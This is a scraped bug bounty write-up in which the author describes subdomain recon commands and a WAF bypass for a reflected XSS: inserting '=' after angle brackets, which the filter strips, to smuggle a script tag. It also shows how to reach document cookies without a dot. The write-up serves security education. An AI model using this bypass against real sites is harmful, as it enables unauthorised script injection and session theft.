---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-08-22_my-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss.md
original_filename: 2023-08-22_my-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss.md
title: 'My First Bug: How I Was Able to Bypass the WAF and Uncover a Reflected XSS'
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: 6eee7a2e6fd9133b52302c7d6f3f0de3417babf0437bfe2cb12aed6a20d5d8df
text_sha256: aea7de40e21d1f81b71cc39f6a9ff4912a07ad520b8bd7adc45b4c32d042aeb5
ingested_at: '2026-06-28T07:32:25Z'
sensitivity: unknown
redactions_applied: false
---

# My First Bug: How I Was Able to Bypass the WAF and Uncover a Reflected XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-08-22_my-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:25Z
- Redactions Applied: False
- Raw SHA256: `6eee7a2e6fd9133b52302c7d6f3f0de3417babf0437bfe2cb12aed6a20d5d8df`
- Text SHA256: `aea7de40e21d1f81b71cc39f6a9ff4912a07ad520b8bd7adc45b4c32d042aeb5`


## Content

---
title: "My First Bug: How I Was Able to Bypass the WAF and Uncover a Reflected XSS"
url: "https://fares7elsadek.medium.com/my-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss-e0534b6f05e4"
authors: ["Fares Elsadek (@err0rbyn1ght)"]
bugs: ["WAF bypass", "Reflected XSS"]
publication_date: "2023-08-22"
added_date: "2023-09-05"
source: "pentester.land/writeups.json"
original_index: 840
scraped_via: "browseros"
---

# My First Bug: How I Was Able to Bypass the WAF and Uncover a Reflected XSS

Top highlight

Fares Elsadek
 highlighted

Fares Elsadek
 highlighted

Fares Elsadek
 highlighted

Fares Elsadek
 highlighted

My First Bug: How I Was Able to Bypass the WAF and Uncover a Reflected XSS
Fares Elsadek
Follow
3 min read
·
Aug 22, 2023

1.4K

15

Hello everyone, I’m Fares. Today, I’ll share the story of how I successfully identified a reflected XSS vulnerability within a public bug bounty program.

To begin with, I followed my usual process of uncovering subdomains, employing tools like Subfinder, assetfinder, and more.

subfinder :

subfinder -d $domain -all > subdomains.txt

assetfinder :

assetfinder $domain -subs-only | grep $domain$ >> subdomains.txt

Once you’ve compiled a list of subdomains using your preferred tool, you can eliminate duplicates using the following command:

cat subdomains.txt | sort -u > sub-list.txt

Now, our goal is to discover live subdomains. For this task, I use a tool called httpx to automate the process.

cat sub-list.txt | httpx > live-sub.txt

After getting the live subdomains, I decided to check them manually. Since the program was public and complex, it was better to search things by hand rather than using automation.

After a deep dive into the program, I discovered an endpoint that appeared to be structured like this:

https://example.domain.com/domain/modules/name.aspx

I figured that if I could fuzz parameters and find “ak” as a valid parameter, I could try adding “FUZZ” to it and analyze the response.

example:

https://example.domain.com/domain/modules/name.aspx?ak=FUZZ

the response was like this :

<p><span class="red"><span id="ak">FUZZ</span></span></p>

That’s interesting because it’s reflected in the response code. So, I attempted to inject a JavaScript code like this:

https://example.domain.com/domain/modules/name.aspx?ak=<script>alert(“hacked”)</script>

But when submitting this request, I was redirected to an error page, which was quite disappointing :(.

So, I started thinking about how to bypass this. I tried various payloads from the internet, but none of them worked for me.

So, I chose to look into it. After trying many different payloads, I found that using “<” and “>” symbols in the payload would cause the page to redirect to the error page again.

After attempting to encode and even double encode it, it still didn’t work either.

But I observed something interesting: when I placed certain special characters after the angle brackets, they were reflected in the response without triggering a redirect.

Get Fares Elsadek’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

it was like this:

https://example.domain.com/domain/modules/name.aspx?ak=<&

the response will be like this:

<p><span class="red"><span id="ak"><&</span></span></p>

so I tried many payloads with the same thing and doesn’t work for me.

After trying out various payloads, I realized that when I submitted the “.” and “=” signs, they were stripped and didn’t show up in the response.

so this will be like:

https://example.domain.com/domain/modules/name.aspx?ak=hacked===.

the response will be:

<p><span class="red"><span id="ak">hacked</span></span></p>

This is getting interesting. Let’s test by adding angle brackets before the equal sign, like this:

https://example.domain.com/domain/modules/name.aspx?ak=<=hacked>=

the response was like this:

<p><span class="red"><span id="ak"><hacked></span></span></p>

And I didn’t get redirected, so I was like:

So, I started crafting the payloads using the same approach, which looked like this:

<=script>=alert("hacked")<=/scirpt>=

and the response was like this :

<p><span class="red"><span id="ak"><script>alert("hacked")</script></span></span></p>
Press enter or click to view image in full size

But here’s a little issue: I can’t access the cookie because the server removes the “.” symbol.

After doing some research, I discovered methods to obtain it without using the “.” symbol, such as:

alret(document["cookie"])

I hope you enjoyed reading the writeup!

the tools that i used: Burp suit , subfinder , assetfinder , httpx

linkedin: https://www.linkedin.com/in/fares-elsadek/

twitter : https://twitter.com/err0rbyn1ght
